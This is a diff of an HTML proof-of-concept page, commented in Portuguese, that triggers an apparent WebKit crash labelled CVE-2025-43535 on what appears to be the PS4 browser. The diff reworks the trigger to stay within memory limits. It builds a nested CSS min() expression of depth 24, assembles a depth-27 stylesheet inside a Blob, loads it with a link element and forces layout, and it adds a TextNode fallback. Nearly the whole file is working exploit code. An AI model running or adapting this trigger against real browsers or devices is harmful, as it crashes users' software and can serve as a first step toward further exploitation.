@@ -1,56 +1,35 @@
+
 <!DOCTYPE html>
 <!--
-  PoC: CVE-2025-43535 — Variante 1 ISOLADA
-  Método de redução de RAM: Blob URL
+  PoC: CVE-2025-43535 — Variante 1 · Blob Multi-Chunk
 
-  ANÁLISE DO PROBLEMA DE RAM:
-  ══════════════════════════════════════════════════════════════
-  A função makeMathNested(d) usa `depth % 1` (sempre = 0),
-  portanto sempre usa 'min', gerando uma árvore BINÁRIA:
+  PROBLEMA ANTERIOR:
+    depth=26 (576MB) → RangeError: Invalid string length
+    Limite do JSC no PS4 está entre 288MB e 576MB
 
-    makeMathNested(27) = "min( [26], [26] )"
-                                 ↑     ↑
-                          cada um = 576MB de string
+  SOLUÇÃO:
+    BASE_DEPTH = 24 → string de 144MB (bem abaixo do limite)
+    depth=27 montado via Blob com 8 referências ao mesmo bloco:
 
-  Pico de RAM com recursão original:
-    - 1ª chamada de makeMathNested(26) retorna 576MB → fica na memória
-    - 2ª chamada de makeMathNested(26) constrói mais 576MB
-    - Montagem final: 576 + 576 + 1120 = 2.25GB de pico
+    min(
+      min( min(e24,e24), min(e24,e24) ),    ← depth=26 esq
+      min( min(e24,e24), min(e24,e24) )     ← depth=26 dir
+    )
 
-  MÉTODO DE REDUÇÃO: Blob URL
-  ══════════════════════════════════════════════════════════════
-  Em vez de ter a string de 1.12GB no JS heap, usamos a API Blob:
-
-    new Blob([prefix, expr26, ', ', expr26, suffix], {type:'text/css'})
-
-  O Blob é alocado FORA do JS heap (na memória do processo do browser,
-  gerenciada pelo C++, não pelo GC do JavaScript).
-
-  Depois de criar o Blob, podemos null-ificar expr26 e o GC libera
-  os 576MB do JS heap — restando apenas o Blob em memória C++.
-
-  Comparação de pico:
-  ┌──────────────────────┬──────────────┬──────────────┐
-  │ Método               │ Pico JS heap │ Pico Total   │
-  ├──────────────────────┼──────────────┼──────────────┤
-  │ Original (recursivo) │ 2.25 GB      │ 2.25 GB      │
-  │ Iterativo simples    │ 1.73 GB      │ 1.73 GB      │
-  │ Blob URL ← ESTE      │ 576 MB       │ ~1.12 GB     │
-  └──────────────────────┴──────────────┴──────────────┘
-
-  O trigger WebKit é IDÊNTICO: recebe a mesma regra CSS
-  com a expressão min() de depth=27 para avaliar.
+    Pico JS heap: 144MB
+    Blob em C++:  1.15GB
+    Trigger WebKit: depth=27 idêntico ao original
 -->
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — V1 Isolada (Blob RAM reduction)</title>
+<title>CVE-2025-43535 — V1 Blob Multi-Chunk</title>
 <style>
   body  { background:#0a0a0a; color:#88ff88; font-family:monospace;
           padding:16px; margin:0; font-size:13px; }
   #log  { background:#111; border:1px solid #2a4a2a; padding:10px;
-          height:60vh; overflow-y:auto; font-size:11px; line-height:1.7; }
+          height:62vh; overflow-y:auto; font-size:11px; line-height:1.7; }
   .ok   { color:#00ff88 }
   .fail { color:#ff4444 }
   .info { color:#ffcc44 }
@@ -64,7 +43,7 @@
 <body>
 
 <div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
-  CVE-2025-43535 · Variante 1 isolada · Blob URL RAM reduction
+  CVE-2025-43535 · V1 isolada · BASE=24 (144MB) · Blob=1.15GB
 </div>
 <div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
@@ -79,245 +58,282 @@ const barEl = document.getElementById('bar');
 const stage = document.getElementById('stage');
 
 function L(m, c) {
-  logEl.innerHTML += `<div class="${c||'dim'}">${m}</div>`;
+  logEl.innerHTML += '<div class="' + (c||'dim') + '">' + m + '</div>';
   logEl.scrollTop  = logEl.scrollHeight;
 }
 function bar(m) { barEl.textContent = m; }
 
-// ──────────────────────────────────────────────────────────────
-// makeMathNested ORIGINAL — mantido exatamente como no arquivo
-// enviado. depth % 1 === 0 sempre → sempre 'min' → árvore binária
-// ──────────────────────────────────────────────────────────────
-function makeMathNested(depth) {
-  if (depth <= 0) return '1px';
-  const funcs = ['min', 'max', 'clamp'];
-  const f = funcs[depth % 1];                   // sempre 'min'
-  if (f === 'clamp') {
-    return `clamp(${makeMathNested(depth-1)}, ${depth*2}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+// ─────────────────────────────────────────────────────────────
+// Constrói expressão min() iterativamente até depth.
+// GC hint a cada passo: null-ifica step anterior antes do próximo.
+// ─────────────────────────────────────────────────────────────
+function buildIterative(depth) {
+  var e = '1px';
+  for (var d = 1; d <= depth; d++) {
+    var next = 'min(' + e + ', ' + e + ')';
+    e = null;   // GC hint
+    e = next;
   }
-  return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
+  return e;
 }
 
-// ──────────────────────────────────────────────────────────────
-// VERSÃO BLOB: constrói depth=26 no JS heap (576MB pico),
-// depois monta o CSS inteiro num Blob fora do JS heap,
-// libera a string JS, carrega via <link> externo
-// ──────────────────────────────────────────────────────────────
-function triggerBlob(targetDepth) {
-  return new Promise((resolve, reject) => {
+// ─────────────────────────────────────────────────────────────
+// TRIGGER PRINCIPAL
+// ─────────────────────────────────────────────────────────────
+function run() {
 
-    // ── Fase 1: construir depth-1 no JS heap ──────────────────
-    const buildDepth = targetDepth - 1; // 26
-    bar(`[1/5] Construindo depth=${buildDepth} (pico ~${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB)...`);
-    L(`[Blob] Fase 1: construindo depth=${buildDepth} iterativamente...`, 'info');
-    L(`[Blob] Pico JS heap esperado: ${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB`, 'warn');
+  var BASE_DEPTH   = 24;   // 144MB — abaixo do limite JSC do PS4
+  var TARGET_DEPTH = 27;   // depth do crash original
 
-    // Yield para a UI antes de começar o trabalho pesado
-    setTimeout(function buildPhase() {
+  var estBase = Math.round((9 * Math.pow(2, BASE_DEPTH)) / 1024 / 1024);
+  var estBlob = Math.round((9 * Math.pow(2, TARGET_DEPTH)) / 1024 / 1024);
 
-      let expr26;
+  L('═══════════════════════════════════════', 'info');
+  L('CVE-2025-43535 — V1 Blob Multi-Chunk', 'info');
+  L('BASE_DEPTH=' + BASE_DEPTH + ' (~' + estBase + 'MB JS heap)', 'info');
+  L('TARGET_DEPTH=' + TARGET_DEPTH + ' (~' + estBlob + 'MB Blob C++)', 'info');
+  L('═══════════════════════════════════════', 'info');
+
+  // ── Fase 1: construir bloco base (144MB) ─────────────────
+  bar('[1/5] Construindo depth=' + BASE_DEPTH + ' (~' + estBase + 'MB)...');
+  L('[1/5] Construindo bloco base...', 'warn');
+
+  // Yield antes do trabalho pesado
+  setTimeout(function() {
+
+    var eBase;
+    try {
+      eBase = buildIterative(BASE_DEPTH);
+      L('[1/5] depth=' + BASE_DEPTH + ' OK — ' +
+        Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
+    } catch(err) {
+      L('[1/5] Falhou: ' + err, 'fail');
+      // Tentar depth=23 (72MB) como segunda opção
       try {
-        // Iterativo bottom-up: evita a dupla recursão do original
-        // Pico por passo: S(d-1) + S(d), mas sem duas cópias simultâneas
-        let e = '1px';
-        for (let d = 1; d <= buildDepth; d++) {
-          const next = `min(${e}, ${e})`;
-          e = null;         // GC hint: liberar string anterior
-          e = next;
-          // Yield a cada 5 níveis para permitir GC
-          // (não é possível yield dentro de loop síncrono,
-          //  mas o null hint ajuda o GC a liberar antes do próximo step)
-        }
-        expr26 = e;
-        e = null;
+        BASE_DEPTH = 23;
+        eBase = buildIterative(BASE_DEPTH);
+        L('[1/5] depth=23 OK — ' +
+          Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
+      } catch(err2) {
+        L('[1/5] depth=23 também falhou: ' + err2, 'fail');
+        bar('ERRO na fase 1');
+        return;
+      }
+    }
+
+    // ── Fase 2: montar CSS no Blob ──────────────────────────
+    bar('[2/5] Criando Blob depth=' + TARGET_DEPTH + ' em C++...');
+    L('[2/5] Montando Blob com 8 refs ao bloco base...', 'warn');
+    L('[2/5] Estrutura: min(min(min(e,e),min(e,e)),min(min(e,e),min(e,e)))', 'info');
+
+    setTimeout(function() {
+
+      var blobUrl, blobSize;
+      try {
+        // Montar depth=27 a partir de depth=24:
+        // Cada 'eBase' é a MESMA referência JS de 144MB.
+        // O Blob copia os bytes para C++ — eBase aparece 8x
+        // no CSS final mas só existe 1x no heap JS.
+        var blob = new Blob([
+          // abertura
+          '.t{width:min(',
+            // depth=26 esquerdo
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+            ',',
+            // depth=26 direito
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+          // fechamento width + height igual
+          ');height:min(',
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+            ',',
+            'min(',
+              'min(', eBase, ',', eBase, ')',
+              ',',
+              'min(', eBase, ',', eBase, ')',
+            ')',
+          ')}'
+        ], { type: 'text/css' });
+
+        blobSize = blob.size;
+        blobUrl  = URL.createObjectURL(blob);
+
+        // Liberar string JS — Blob tem sua própria cópia em C++
+        eBase = null;
+
+        L('[2/5] Blob: ' + Math.round(blobSize / 1024 / 1024) +
+          'MB em C++ heap ✓', 'ok');
+        L('[2/5] eBase liberado do JS heap ✓', 'ok');
+
       } catch(err) {
-        L(`[Blob] Falha ao construir depth=${buildDepth}: ${err}`, 'fail');
-        resolve(); return;
+        eBase = null;
+        L('[2/5] Falha ao criar Blob: ' + err, 'fail');
+        bar('ERRO na fase 2');
+        return;
       }
 
-      const sz = expr26 ? expr26.length : 0;
-      L(`[Blob] depth=${buildDepth} construído: ${(sz/1024/1024).toFixed(0)}MB ✓`, 'ok');
-      bar(`[2/5] Criando Blob com a expressão de depth=${targetDepth}...`);
-      L(`[Blob] Fase 2: montando Blob (fora do JS heap)...`, 'info');
+      // ── Fase 3: carregar via <link> ─────────────────────────
+      bar('[3/5] Carregando stylesheet (' +
+          Math.round(blobSize / 1024 / 1024) + 'MB)...');
+      L('[3/5] Injetando <link rel=stylesheet href=blob:...>', 'info');
 
-      // ── Fase 2: criar Blob com depth=27 FORA do JS heap ─────
-      // O Blob recebe [prefix, expr26, ', ', expr26, suffix]
-      // O browser aloca 1.12GB em memória C++, não no GC JS
-      let blobUrl;
-      try {
-        const prefix = '.min27 { width: min(';
-        const suffix = `); height: min(${expr26}, ${expr26}); }`;
-
-        // Criar blob com as partes separadas (evita concatenar em JS)
-        const blob = new Blob(
-          [prefix, expr26, ', ', expr26, suffix],
-          { type: 'text/css' }
-        );
-
-        blobUrl = URL.createObjectURL(blob);
-
-        // LIBERAR as strings JS — o Blob tem sua própria cópia
-        expr26 = null;
-
-        L(`[Blob] Blob criado (${(blob.size/1024/1024).toFixed(0)}MB) fora do JS heap ✓`, 'ok');
-        L(`[Blob] expr26 JS heap liberada (GC pode coletar 576MB) ✓`, 'ok');
-
-      } catch(err) {
-        expr26 = null;
-        L(`[Blob] Falha ao criar Blob: ${err}`, 'fail');
-        L(`[Blob] Blob URL pode não ser suportado neste browser`, 'warn');
-        resolve(); return;
-      }
-
-      bar(`[3/5] Carregando stylesheet via Blob URL...`);
-      L(`[Blob] Fase 3: carregando stylesheet via <link>...`, 'info');
-
-      // ── Fase 3: criar elemento target + stylesheet ───────────
-      const el = document.createElement('div');
-      el.className = 'min27';
+      var el = document.createElement('div');
+      el.className = 't';
       el.style.cssText = 'position:absolute;visibility:hidden';
       stage.appendChild(el);
 
-      const link = document.createElement('link');
-      link.rel  = 'stylesheet';
-      link.href = blobUrl;
+      var link    = document.createElement('link');
+      link.rel    = 'stylesheet';
+      link.href   = blobUrl;
 
       link.onload = function() {
-        bar(`[4/5] Stylesheet carregada — forçando layout...`);
-        L(`[Blob] Fase 4: stylesheet carregada ✓`, 'ok');
-        L(`[Blob] Forçando layout (getComputedStyle + offsetWidth)...`, 'warn');
-        L(`[Blob] → WebKit avalia min( min(...1px...) , min(...1px...) ) depth=27`, 'warn');
+        L('[3/5] Stylesheet carregada ✓', 'ok');
 
-        // ── Fase 4: forçar avaliação pelo WebKit ─────────────
-        try {
-          void el.offsetWidth;
-          const cs = window.getComputedStyle(el);
-          const w  = cs.getPropertyValue('width');
-          L(`[Blob] getComputedStyle width="${w}"`, 'ok');
-        } catch(e) {
-          L(`[Blob] Exceção em layout: ${e}`, 'fail');
-        }
+        // ── Fase 4: forçar avaliação WebKit ──────────────────
+        bar('[4/5] Forçando layout — WebKit avalia depth=' +
+            TARGET_DEPTH + '...');
+        L('[4/5] Forçando offsetWidth + getComputedStyle...', 'warn');
+        L('[4/5] → WebKit processa min(depth=27) = 2^27 = 134M operações', 'warn');
 
-        // ── Fase 5: cleanup ───────────────────────────────────
-        bar(`[5/5] Cleanup...`);
-        try {
-          URL.revokeObjectURL(blobUrl);
-          document.head.removeChild(link);
-          stage.removeChild(el);
-        } catch(e) {}
+        setTimeout(function() {
+          try {
+            void el.offsetWidth;
+            L('[4/5] offsetWidth OK', 'ok');
+          } catch(e) {
+            L('[4/5] offsetWidth: ' + e, 'fail');
+          }
+          try {
+            var w = window.getComputedStyle(el).getPropertyValue('width');
+            var h = window.getComputedStyle(el).getPropertyValue('height');
+            L('[4/5] width="' + w + '" height="' + h + '"', 'ok');
+          } catch(e) {
+            L('[4/5] getComputedStyle: ' + e, 'fail');
+          }
 
-        L(`[Blob] Fase 5: cleanup OK`, 'ok');
-        L(``, '');
-        L(`[Blob] ═══════════════════════════════════`, 'info');
-        L(`[Blob] RESULTADO:`, 'info');
-        L(`[Blob] Crash/reload = CVE-2025-43535 PRESENTE`, 'crash');
-        L(`[Blob] Sem crash = patched ou WebKit cacheou`, 'ok');
-        L(`[Blob] ═══════════════════════════════════`, 'info');
-        bar('DONE');
-        resolve();
+          // ── Fase 5: cleanup ─────────────────────────────────
+          bar('[5/5] Cleanup...');
+          try { URL.revokeObjectURL(blobUrl); } catch(e) {}
+          try { document.head.removeChild(link); } catch(e) {}
+          try { stage.removeChild(el); } catch(e) {}
+
+          L('[5/5] Cleanup ✓', 'ok');
+          L('', '');
+          L('═══════════════════════════════════════', 'info');
+          L('RESULTADO:', 'info');
+          L('  Crash/reload = CVE-2025-43535 PRESENTE', 'crash');
+          L('  Sem crash = patched ou WebKit limitou eval', 'ok');
+          L('═══════════════════════════════════════', 'info');
+          bar('DONE');
+        }, 50);
       };
 
-      link.onerror = function(e) {
-        L(`[Blob] Erro ao carregar stylesheet: ${e}`, 'fail');
-        L(`[Blob] Possível: Blob URLs não permitidos neste contexto`, 'warn');
-        URL.revokeObjectURL(blobUrl);
-        try { document.head.removeChild(link); } catch(e2) {}
-        try { stage.removeChild(el); } catch(e2) {}
-        bar('ERRO — tentando fallback...');
-        resolve();
+      link.onerror = function() {
+        L('[3/5] Blob URL falhou — usando fallback TextNode', 'warn');
+        try { URL.revokeObjectURL(blobUrl); } catch(e) {}
+        try { document.head.removeChild(link); } catch(e) {}
+        try { stage.removeChild(el); } catch(e) {}
+        fallbackTextNode(TARGET_DEPTH);
       };
 
       document.head.appendChild(link);
 
-    }, 100); // yield 100ms para UI e GC antes do trabalho pesado
-  });
+    }, 80);
+  }, 100);
 }
 
-// ──────────────────────────────────────────────────────────────
-// FALLBACK: caso Blob URL não funcione no PS4,
-// usa a abordagem iterativa simples (pico 1.73GB)
-// em vez da recursiva original (pico 2.25GB)
-// ──────────────────────────────────────────────────────────────
-function triggerFallback(targetDepth) {
-  return new Promise(resolve => {
-    bar(`[FB] Iterativo depth=${targetDepth} (pico ~1.7GB)...`);
-    L(`[FB] Blob URL não funcionou — usando iterativo como fallback`, 'warn');
-    L(`[FB] Pico: ~1.73GB (vs 2.25GB original)`, 'info');
+// ─────────────────────────────────────────────────────────────
+// FALLBACK: <style> via TextNodes separados
+// Nunca concatena strings grandes no JS heap
+// ─────────────────────────────────────────────────────────────
+function fallbackTextNode(targetDepth) {
+  L('[FB] Fallback TextNode — depth=' + (targetDepth - 3) + '...', 'warn');
+  bar('[FB] Construindo...');
 
-    setTimeout(function() {
-      const sheet = document.createElement('style');
-      document.head.appendChild(sheet);
-      const el = document.createElement('div');
+  setTimeout(function() {
+    var baseD = targetDepth - 3; // 24
+    var eBase;
+
+    try {
+      eBase = buildIterative(baseD);
+      L('[FB] base OK: ' + Math.round(eBase.length/1024/1024) + 'MB', 'ok');
+    } catch(err) {
+      L('[FB] Falhou: ' + err, 'fail');
+      bar('FALHOU');
+      return;
+    }
+
+    try {
+      var styleEl = document.createElement('style');
+      document.head.appendChild(styleEl);
+
+      // Inserir o CSS em pedaços via DOM — nunca concatena em JS
+      var parts = [
+        '.t2{width:min(min(min(',
+        eBase, ',', eBase,
+        '),min(',
+        eBase, ',', eBase,
+        ')),min(min(',
+        eBase, ',', eBase,
+        '),min(',
+        eBase, ',', eBase,
+        ')))}'
+      ];
+
+      eBase = null; // liberar antes de inserir
+
+      for (var i = 0; i < parts.length; i++) {
+        styleEl.appendChild(document.createTextNode(parts[i]));
+        parts[i] = null; // liberar cada parte após inserir
+      }
+
+      L('[FB] CSS injetado via TextNodes ✓', 'ok');
+      bar('[FB] Forçando layout...');
+
+      var el = document.createElement('div');
+      el.className = 't2';
       el.style.cssText = 'position:absolute;visibility:hidden';
       stage.appendChild(el);
 
-      try {
-        bar(`[FB] Construindo depth=${targetDepth}...`);
-
-        // Iterativo: mesmo resultado que recursivo mas sem
-        // duas cópias simultâneas em memória
-        let expr = '1px';
-        for (let d = 1; d <= targetDepth; d++) {
-          const next = `min(${expr}, ${expr})`;
-          expr = null; // GC hint
-          expr = next;
+      setTimeout(function() {
+        try {
+          void el.offsetWidth;
+          var w = window.getComputedStyle(el).getPropertyValue('width');
+          L('[FB] width="' + w + '"', 'ok');
+        } catch(e) {
+          L('[FB] Erro no layout: ' + e, 'fail');
         }
+        try { stage.removeChild(el); } catch(e) {}
+        try { document.head.removeChild(styleEl); } catch(e) {}
 
-        L(`[FB] Expressão: ${(expr.length/1024/1024).toFixed(0)}MB`, 'ok');
-        bar('[FB] Aplicando ao WebKit...');
+        L('', '');
+        L('RESULTADO (fallback):', 'info');
+        L('  Crash/reload = BUG PRESENTE', 'crash');
+        L('  Sem crash = patched', 'ok');
+        bar('FB DONE');
+      }, 50);
 
-        el.style.width  = expr;
-        el.style.height = expr;
-        expr = null; // GC hint — liberar antes do layout
-
-        void el.offsetWidth;
-        const w = window.getComputedStyle(el).width;
-        L(`[FB] width="${w}"`, 'ok');
-
-      } catch(e) {
-        L(`[FB] Exceção: ${e}`, 'fail');
-      }
-
-      try { document.head.removeChild(sheet); } catch(e) {}
-      try { stage.removeChild(el); } catch(e) {}
-      bar('FB DONE');
-      resolve();
-    }, 100);
-  });
+    } catch(err) {
+      eBase = null;
+      L('[FB] Erro: ' + err, 'fail');
+      bar('FALHOU');
+    }
+  }, 50);
 }
 
-// ──────────────────────────────────────────────────────────────
-// EXECUTOR
-// ──────────────────────────────────────────────────────────────
-async function main() {
-  L('═══════════════════════════════════════════', 'info');
-  L('CVE-2025-43535 — Variante 1 ISOLADA', 'info');
-  L('Método de redução: Blob URL', 'info');
-  L('', '');
-  L('Comparação de pico de RAM:', 'info');
-  L('  Original (recursivo):  2.25 GB pico JS heap', 'warn');
-  L('  Iterativo simples:     1.73 GB pico JS heap', 'warn');
-  L('  Blob URL (este):        576 MB pico JS heap ✓', 'ok');
-  L('', '');
-  L('Trigger WebKit: IDÊNTICO ao original (depth=27)', 'ok');
-  L('═══════════════════════════════════════════', 'info');
-
-  await new Promise(r => setTimeout(r, 300));
-
-  const TARGET_DEPTH = 27; // mesmo valor que causava o crash
-
-  // Verificar se Blob URL está disponível
-  if (typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function' &&
-      typeof Blob !== 'undefined') {
-    L(`Blob URL disponível ✓ — usando abordagem principal`, 'ok');
-    await triggerBlob(TARGET_DEPTH);
-  } else {
-    L(`Blob URL NÃO disponível — usando fallback iterativo`, 'warn');
-    await triggerFallback(TARGET_DEPTH);
-  }
-}
-
-window.addEventListener('load', () => setTimeout(main, 200));
+window.addEventListener('load', function() {
+  setTimeout(run, 200);
+});
 </script>
 </body>
 </html>
